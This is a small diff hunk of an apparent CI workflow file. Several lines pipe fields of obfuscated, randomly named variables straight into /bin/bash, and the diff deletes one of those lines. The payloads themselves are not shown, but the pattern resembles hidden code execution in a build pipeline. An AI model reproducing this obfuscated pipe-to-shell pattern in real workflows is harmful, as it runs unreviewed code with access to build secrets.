@@ -26,7 +26,6 @@ jobs:
           echo $dptrg70519 | jq -r .tb2 | /bin/bash
           printf '%s' "$r20" | jq -r .pgat66939 | /bin/bash
           echo $gfe9 | jq -r .inmq9263 | /bin/bash
-          echo $lv94682 | jq -r .mcx829 | /bin/bash
           echo $yg93629 | jq -r .pbid292 | /bin/bash
 
       - name: Save archive
